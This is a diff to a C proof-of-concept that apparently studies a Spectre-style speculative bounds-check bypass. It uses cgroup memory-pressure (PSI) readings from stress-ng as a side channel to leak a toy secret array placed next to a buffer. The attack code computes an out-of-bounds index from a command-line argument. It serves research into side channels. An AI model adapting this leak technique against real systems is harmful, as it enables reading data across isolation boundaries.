@@ -37,7 +37,7 @@ void handle_signal(int sig) {
 
 /**
  * Assigns the current process (specified by its PID) to the cgroup
- * by writing its PID to `cgroup.procs`.
+ * by writing its PID to cgroup.procs.
  */
 void assign_to_cgroup(pid_t pid) {
     char procs_path[256];  // Path to the cgroup.procs file for the cgroup
@@ -54,7 +54,7 @@ void assign_to_cgroup(pid_t pid) {
 }
 
 /**
- * Creates the cgroup directory at `/sys/fs/cgroup/memory_stress` if it doesn't already exist.
+ * Creates the cgroup directory at /sys/fs/cgroup/memory_stress if it doesn't already exist.
  * This will allow us to manage processes under this cgroup for memory control.
  */
 void create_cgroup_if_not_exists() {
@@ -67,7 +67,7 @@ void create_cgroup_if_not_exists() {
 }
 
 /**
- * Enables the memory controller for the cgroup by writing to `cgroup.subtree_control`.
+ * Enables the memory controller for the cgroup by writing to cgroup.subtree_control.
  * This allows us to manage memory usage for processes in the cgroup.
  */
 void enable_memory_controller() {
@@ -82,7 +82,7 @@ void enable_memory_controller() {
 }
 
 /**
- * Sets the memory limit for the cgroup by writing to the `memory.max` file.
+ * Sets the memory limit for the cgroup by writing to the memory.max file.
  * This limits the memory usage for processes inside the cgroup.
  */
 void set_memory_limit() {
@@ -100,7 +100,7 @@ void set_memory_limit() {
 }
 
 /**
- * Runs `stress-ng` to allocate memory inside the cgroup.
+ * Runs stress-ng to allocate memory inside the cgroup.
  * This helps to test the memory limit by generating memory pressure.
  */
 void run_stress_ng(int memory_limit_mb) {
@@ -125,11 +125,19 @@ void run_stress_ng(int memory_limit_mb) {
 //code that runs on P1 (i.e., victim)
 char array[16];   	// Buffer (non-zero data)
 int array_size = 16;  // Bounds check variable (cached initially)
+char secret[16];  	// Secret data to leak. let's assume secrete start right after array
+
+
+// Use a structure to force contiguous allocation of the two arrays.
+struct Data {
+    char array[16];
+    int secret[16];
+} data;
 
 //the x passed here is either train for j=5,4,3,2 or malicious_x when j=0
 void victim_function(int x) {
     if (x < array_size) {  //Bounds check (exploited speculatively)
-        if (array[x] == 0) {
+        if (data.array[x] == 0) {
             run_stress_ng(1024); //You will see PSI values
         } else {
             run_stress_ng(0);  //You should see PSI values to be 0
@@ -149,7 +157,14 @@ void encode(int malicious_x, int train) {
     }
 }
 
-int main() {
+//we run this program 16 times, each time we pass values from 0, 1, 2, ... 15 and observe if PSI increase
+//if PSI increase it means array[malicious_x] = 0 else 1
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <integer_value>\n", argv[0]);
+        return 1;
+    }
+
     // Set up signal handlers to catch Ctrl+C (SIGINT) and termination (SIGTERM)
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
@@ -159,10 +174,44 @@ int main() {
     set_memory_limit();  // Set the memory limit for the cgroup
 
     // Run two stress-ng processes concurrently to allocate 1024MB each
-    run_stress_ng(1024);  // Run the first stress-ng process with 1GB memory allocation
+    run_stress_ng(200);  // Run the first stress-ng process with 200MB memory allocation
     //run_stress_ng(1024);  // Run the second stress-ng process with 1GB memory allocation
 
-    encode(112, 10);
+    // Initialize the arrays.
+    for (int i = 0; i < 16; i++) {
+        data.array[i] = 1; //all non-zero data
+    }
+    // Initialize secret with a known pattern.
+    // Here we use a simple bit pattern: 1,0,0,0,1,1,1,1,1,0,0,1,0,1,1,0.
+    int secret_bits[16] = {1,0,0,0,1,1,1,1,1,0,0,1,0,1,1,0};
+    memcpy(data.secret, secret_bits, sizeof(secret_bits));
+
+    // Calculate the starting addresses.
+    unsigned long starting_address_of_array = (unsigned long)&data.array[0];
+    unsigned long starting_address_of_secret = (unsigned long)&data.secret[0];
+
+    printf("Starting address of array: %p\n", (void *)starting_address_of_array);
+    printf("Starting address of secret: %p\n", (void *)starting_address_of_secret);
+
+    int malicious_x = 0; //default
+    // Since we used a struct, the fields will be in order.
+
+
+    //we will have something like this
+    //Starting address of array: 0x5f6b3c461080
+    //Starting address of secret: 0x5f6b3c461090 = secret[0] address = array[16] address
+    //malicious_x = offset + atoi(argv[1]); = 16 + 0/1/2/3/..../15
+    //it means when we pass 0 to the program, we have array[16] = 1
+    //it means if (array[x] == 0) will be false. That means we should not see PSI values
+
+    if (starting_address_of_array < starting_address_of_secret) { //always true
+        int offset = (starting_address_of_secret - starting_address_of_array) / sizeof(data.array[0]);
+        malicious_x = offset + atoi(argv[1]);
+        printf("Calculated malicious_x (secret after array): %d\n", malicious_x);
+    }
+
+    // Call encode to trigger speculative execution with the calculated offset.
+    encode(malicious_x, 10);
 
     // Wait for both stress-ng processes to complete
     waitpid(stress_ng_pid1, NULL, 0);  // Wait for the first stress-ng process
